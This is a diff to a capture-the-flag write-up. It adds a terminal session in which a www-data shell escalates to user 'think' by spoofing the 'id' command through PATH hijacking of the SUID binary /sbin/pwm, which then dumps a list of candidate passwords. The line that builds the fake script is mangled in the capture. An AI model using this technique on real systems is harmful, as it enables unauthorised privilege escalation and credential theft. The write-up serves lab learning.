@@ -467,3 +467,72 @@ uid=%*u(%[^)])
 > [!note]
 > Turns out this was a 2 part exploit with SUID bit binary set and PATH hijacking:
 
+```
+www-data@ip-10-66-172-224:/tmp$ echo '#!/bin/bash' > id
+<0(think) gid=1000(think) groups=1000(think)"' >> id
+www-data@ip-10-66-172-224:/tmp$ chmod +x /tmp/id
+chmod +x /tmp/id
+www-data@ip-10-66-172-224:/tmp$ ls -la /tmp/id
+ls -la /tmp/id
+-rwxr-xr-x 1 www-data www-data 70 Feb 14 18:38 /tmp/id
+www-data@ip-10-66-172-224:/tmp$ /tmp/id
+
+/tmp/id
+uid=1000(think) gid=1000(think) groups=1000(think)
+www-data@ip-10-66-172-224:/tmp$ 
+www-data@ip-10-66-172-224:/tmp$ export PATH=/tmp:$PATH
+export PATH=/tmp:$PATH
+www-data@ip-10-66-172-224:/tmp$ /sbin/pwm
+/sbin/pwm
+[!] Running 'id' command to extract the username and user ID (UID)
+[!] ID: think
+jose1006
+jose1004
+jose1002
+jose1001teles
+jose100190
+jose10001
+jose10.asd
+jose10+
+jose0_07
+jose0990
+jose0986$
+jose098130443
+jose0981
+jose0924
+jose0923
+jose0921
+thepassword
+jose(1993)
+jose'sbabygurl
+jose&vane
+jose&takie
+jose&samantha
+jose&pam
+jose&jlo
+jose&jessica
+jose&jessi
+josemario.AKA(think)
+jose.medina.
+jose.mar
+jose.luis.24.oct
+jose.line
+jose.leonardo100
+jose.leas.30
+jose.ivan
+jose.i22
+jose.hm
+jose.hater
+jose.fa
+jose.f
+jose.dont
+jose.d
+jose.com}
+jose.com
+jose.chepe_06
+jose.a91
+jose.a
+jose.96.
+jose.9298
+jose.2856171
+```
